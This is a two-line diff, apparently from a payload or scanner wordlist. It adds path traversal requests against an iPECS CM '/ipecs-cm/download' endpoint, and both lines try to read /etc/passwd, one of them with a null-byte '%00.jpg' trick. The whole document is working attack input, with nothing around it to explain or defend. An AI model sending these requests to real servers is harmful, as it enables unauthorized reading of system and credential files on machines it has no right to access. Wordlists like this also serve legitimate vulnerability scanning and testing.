@@ -1,0 +1,2 @@
+/ipecs-cm/download?filename=../../../../../../../../../../etc/passwd&filepath=/home/wms/www/data
+/ipecs-cm/download?filename=jre-6u13-windows-i586-p.exe&filepath=../../../../../../../../../../etc/passwd%00.jpg
